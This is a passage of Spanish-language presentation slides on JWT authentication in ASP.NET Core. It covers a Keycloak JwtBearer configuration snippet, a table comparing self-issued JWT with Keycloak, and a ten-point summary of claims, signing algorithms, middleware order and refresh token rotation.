        options.Audience  = builder.Configuration["Keycloak:Audience"];
        options.RequireHttpsMetadata =
            builder.Configuration.GetValue<bool>("Keycloak:RequireHttps");

        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuerSigningKey = true,
            ValidateIssuer           = true,
            ValidateAudience         = true,
            ValidateLifetime         = true,
            ClockSkew                = TimeSpan.Zero
        };
    });
```

---

## JWT propio vs Keycloak  -  ¿cuándo usar cada uno?

| Criterio | JWT Propio | Keycloak |
|---|---|---|
| App simple, un solo servicio | **[OK] Más simple** | Overhead significativo |
| Múltiples apps en el mismo tenant | Cada app gestiona sus tokens | **[OK] SSO entre todas** |
| Proveedores externos (Google, GitHub) | Implementar por separado | **[OK] Identity Brokering** |
| MFA obligatorio | Implementar por separado | **[OK] Configuración en UI** |
| Control total del flujo de auth | **[OK] Implementación propia** | Limitado por Keycloak |
| Microservicios con RS256 | Posible pero manual | **[OK] Nativo** |

> **el sistema de mensajería usa JWT propio** (HS256). Keycloak entraría en escena si la empresa necesitara SSO entre múltiples productos o login con Google/Microsoft.

---

<!-- _class: lead -->

# Resumen

## Lo esencial de JWT + Auth en .NET

---

## Resumen  -  puntos clave

1. **Autenticación** verifica identidad; **Autorización** verifica permisos  -  son dos middlewares distintos.
2. JWT = Header.Payload.Signature  -  el Payload es solo Base64, **no está cifrado**.
3. Claims del CRM: `sub` (GUID del agente), `email`, `ClaimTypes.Role` (`Admin`/`Agent`/`Viewer`), `tenant_id`, `jti`.
4. **HS256** para monolitos (secreto compartido); **RS256** para microservicios (par de claves).
5. `AddJwtAuthentication(builder.Configuration)`  -  extensión en `JwtAuthExtensions.cs` con `ClockSkew = TimeSpan.Zero`.
6. Orden del pipeline: `UseAuthentication()` -> `UseAuthorization()` -> `UseMiddleware<TenantClaimsMiddleware>()`.
7. `TenantClaimsMiddleware` extrae `tenant_id` del JWT y lo inyecta en `ITenantContextAccessor`.
8. `IJwtTokenService.GenerateAccessToken(publicId, email, role, tenantId)`  -  los 4 datos que van en cada token.
9. Refresh Token Rotation: `RevokeAsync` del anterior + `InsertAsync` del nuevo en cada llamada a `/api/auth/refresh`.
10. Responses reales: `LoginSuccess/Failure`, `RegisterSuccess/EmailConflict/TenantNotFound`, `RefreshTokenSuccess/InvalidFailure`.

> **Stack del proyecto:** HS256  -  `Jwt:Key` vía User Secrets (dev) + AWS Secrets Manager (prod)  -  Roles: `Admin` / `Agent` / `Viewer`
